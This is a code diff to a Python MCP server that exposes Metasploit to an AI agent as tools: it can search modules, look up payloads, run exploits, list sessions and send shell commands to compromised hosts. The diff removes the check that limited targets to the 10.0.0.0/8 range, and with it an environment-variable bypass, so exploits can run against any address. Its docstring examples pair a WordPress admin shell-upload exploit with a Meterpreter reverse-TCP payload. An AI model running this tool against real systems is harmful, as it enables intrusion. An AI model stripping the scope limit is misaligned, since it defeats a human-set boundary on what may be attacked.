@@ -11,31 +11,31 @@ client = MsfRpcClient(
     ssl=True,
 )
 
-def check_target(ip: str):
-    # Check if target is inside 10.0.0.0/8
-    # if ip.startswith("10."):
-        # return True
-    return True
 
 @mcp.tool("metasploit_search")
 async def metasploit_search(query: str, ctx: Context = None):
     """
     Search for a module in Metasploit using the provided query.
     Returns the search results as a list of module names.
+    Example usage:
+    metasploit_search("wordpress 4.6")
     """
-    if not check_target(query) and os.getenv("SUPER_SECRET_BACKDOOR_VARIABLE_ONLY_CHANGE_IF_YOU_KNOW_WHAT_YOU_ARE_DOING") != "true":
-        return "Invalid target. Only 10.0.0.0/8 addresses are allowed."
     try:
         results = client.modules.search(query)
         return results
     except Exception as e:
         return f"Error during Metasploit search: {str(e)}"
-    
+
+
 @mcp.tool("metasploit_info")
 async def metasploit_info(module_type: str, module_name: str, ctx: Context = None):
     """
     Get information about a specific Metasploit module.
-    Returns the module's description and options.
+    Returns a dictionary with the module's description, options, and references.
+    Example usage:
+    metasploit_info("exploit", "unix/webapp/wp_admin_shell_upload")
+    module_type is "exploit", "auxiliary", "post", "payload", or "encoder".
+    module_name is the name of the module excluding the type.
     """
     try:
         mod = client.modules.use(module_type, module_name)
@@ -47,12 +47,16 @@ async def metasploit_info(module_type: str, module_name: str, ctx: Context = Non
         return info
     except Exception as e:
         return f"Error retrieving module info: {str(e)}"
-    
+
+
 @mcp.tool("metasploit_module_payloads")
 async def metasploit_module_payloads(module: str, ctx: Context = None):
     """
     List all available payloads for a given Metasploit exploit module.
     Returns a list of payload names.
+    Example usage:
+    metasploit_module_payloads("unix/webapp/wp_admin_shell_upload")
+    module is the name of the exploit module excluding the leading "exploit/".
     """
     try:
         mod = client.modules.use("exploit", module)
@@ -60,12 +64,16 @@ async def metasploit_module_payloads(module: str, ctx: Context = None):
         return payloads
     except Exception as e:
         return f"Error retrieving payloads for module {module}: {str(e)}"
-    
+
+
 @mcp.tool("metasploit_payload_info")
 async def metasploit_payload_info(payload: str, ctx: Context = None):
     """
     Get information about a specific Metasploit payload.
     Returns the payload's description and options.
+    Example usage:
+    metasploit_payload_info("php/meterpreter/reverse_tcp")
+    payload is the name of the payload excluding the leading "payload/".
     """
     try:
         mod = client.modules.use("payload", payload)
@@ -78,12 +86,27 @@ async def metasploit_payload_info(payload: str, ctx: Context = None):
     except Exception as e:
         return f"Error retrieving payload info: {str(e)}"
 
+
 @mcp.tool("metasploit_exploit")
-async def metasploit_exploit(module: str, module_options: dict, payload: str, payload_options: dict, ctx: Context = None):
+async def metasploit_exploit(
+    module: str,
+    module_options: dict,
+    payload: str,
+    payload_options: dict,
+    ctx: Context = None,
+):
     """
     Run a Metasploit exploit module against the specified target with the provided options.
     Both options are a dictionary of module parameters. The payload is a string representing the payload to use.
-    Returns the result of the exploit attempt.
+    Returns the output of the exploit execution.
+    Example usage:
+    metasploit_exploit("unix/webapp/wp_admin_shell_upload", {"RHOST": "<target_ip>"}, "php/meterpreter/reverse_tcp", {"LHOST": "<local_ip>", "LPORT": 4444})
+    module is the name of the exploit module excluding the leading "exploit/".
+    payload is the name of the payload excluding the leading "payload/".
+    module_options is a dictionary of options for the exploit module.
+    You can use the `metasploit_info` tool to get the available options for a module.
+    payload_options is a dictionary of options for the payload.
+    You can use the `metasploit_payload_info` tool to get the available options for a payload.
     """
     try:
         result = client.modules.use("exploit", module)
@@ -92,29 +115,40 @@ async def metasploit_exploit(module: str, module_options: dict, payload: str, pa
             payload[key] = value
         for key, value in module_options.items():
             result[key] = value
-        return result.execute(payload=payload)
+        return client.consoles.console().run_module_with_output(result, payload)
     except Exception as e:
         return f"Error during Metasploit exploit: {str(e)}"
+
 
 @mcp.tool("metasploit_sessions")
 async def metasploit_sessions(ctx: Context = None):
     """
     List all active Metasploit sessions.
     Returns a list of session IDs and their details.
+    Example usage:
+    metasploit_sessions()
     """
     try:
         sessions = client.sessions.list
         return sessions
     except Exception as e:
         return f"Error retrieving Metasploit sessions: {str(e)}"
-    
+
+
 @mcp.tool("metasploit_session_interact")
-async def metasploit_session_interact(session_id: str, command: str, timeout: float, ctx: Context = None):
+async def metasploit_session_interact(
+    session_id: str, command: str, timeout: float, ctx: Context = None
+):
     """
     Interact with a specific Metasploit session. Writes a command to the session and returns the output.
     The session_id is the ID of the session to interact with, command is the command to execute,
     and timeout is the time to wait for the command to execute (in seconds).
-    Returns the output of the command executed in the session after the timeout.
+    Returns the output of the command executed in the session after the timeout has passed, regardless if the command has finished or not.
+    Example usage:
+    metasploit_session_interact("1", "whoami", 5)
+    session_id is the ID of the session to interact with.
+    command is the command to execute in the session.
+    timeout is the time to wait for the command to execute (in seconds).
     """
     try:
         session = client.sessions.session(session_id)
@@ -126,6 +160,7 @@ async def metasploit_session_interact(session_id: str, command: str, timeout: fl
             return f"Session {session_id} does not exist."
     except Exception as e:
         return f"Error interacting with session {session_id}: {str(e)}"
+
 
 if __name__ == "__main__":
     mcp.run(transport="stdio")
